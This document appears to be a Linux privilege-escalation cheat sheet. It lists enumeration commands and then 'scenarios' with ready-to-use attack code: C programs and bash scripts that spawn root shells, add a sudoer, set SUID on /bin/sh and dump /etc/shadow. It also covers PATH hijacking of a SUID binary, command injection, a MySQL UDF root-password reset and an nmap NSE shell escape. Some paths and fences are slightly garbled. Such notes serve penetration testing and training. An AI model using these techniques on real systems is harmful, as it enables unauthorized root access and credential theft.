#### Check kernel version
- uname -a

#### Environmental variables
- cat /etc/profile
- cat /etc/bashrc
- cat ~/.bash_profile
- cat ~/.bashrc
- cat ~/.bash_logout

#### Check common location for user installed software
- /usr/local/
- /usr/local/src
- /usr/local/bin
- /opt/
- /home
- /var/
- /usr/src/

#### Unmounted filesystem
- mount -l
- cat /etc/fstab

#### Access to more binaries
- export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

#### Find 
- find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;

#### Find world writable files
- find / -writable -type d 2>/dev/null
- find / -writable -type f 2>/dev/null
- find / -perm -222 -type d 2>/dev/null
- find / -perm -o w -type d 2>/dev/null
- find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null

##### Find world writable folder
- find / -perm -o x -type d 2>/dev/null

##### Find world writable and executable folders
- find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

#### Execute file as root
- sudo -l

#### Installed apps
- ls -alh /usr/bin/
- ls -alh /sbin/
- dpkg -l
- rpm -qa
- ls -alh /var/cache/apt/archivesO
- ls -alh /var/cache/yum/

#### Checking log history
- /var/log/syslog/cronlog

#### World writable directories
- /tmp
- /var/tmp
- /dev/shm
- /var/spool/vbox
- /var/spool/samba

-----------------------------------------------------------------------------------------------------------------------
## Case study
### Secanrio 1
#### Create usefull C file
```

```
int main()
{
  setuid(0);
  system("/bin/bash -p");
}

gcc -o [name] [filename.c]
```
int main()
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", 0)
}
```

#### Create usefull bash script

##### Make a user sudoer
```
#!/bin/bash
adduser test sudo
```

##### Get a root shell
```
#!/bin/bash
chown root:root /bin/sh ; chmod 4777 /bin/sh

run: /bin/sh
```

##### Read /etc/shadow

```
#!/bin/bash
cat /etc/shadow > /tmp/shadow
```
### Secanrio 2

- Improper suid example 1

```suid binary use command cat /path/file```

- run the cat command without providing the full path.

##### Privesc

```
cd /tmp
echo /bin/bash > cat
chmod 777 cat
export PATH=/tmp:$PATH
run binary
```
- Improper suid example 2

```suid binary passed user input is to the /bin/echo command```

- command injection

##### Privesc

```
./suidbinary
Meassage for root: hello && /bin/sh
id 
```
### Secanrio 3
#### Crontab
- ***Cron jobs***: https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/

### Scenario 4
#### For MySQL running with root privilege
- https://www.exploit-db.com/exploits/1518
```
system commnad example:
select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown smeagol.smeagol /tmp/out');
su -
root:passwd
```

### Scenario 5
#### privesc via nmap
```
sudo -l
output: (root) NOPASSWD: /usr/bin/nmap
- echo "os.execute('/bin/sh')">/tmp/privesc.nse
- sudo -u root /usr/bin/nmap --script=/tmp/privesc.nse
```


#### Run usefull script for linux enumeration
- ***Linenum***: https://github.com/rebootuser/LinEnum
- ***Linuxprivchecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxExploitSuggester***: https://github.com/mzet-/linux-exploit-suggester
- ***LinuxExploitSuggester2***: https://github.com/jondonas/linux-exploit-suggester-2
- ***LinuxPrivChecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxSmartEnumeration***: https://github.com/diego-treitos/linux-smart-enumeration

#### 6) Enumerate /var directory and uncommon files and directory names

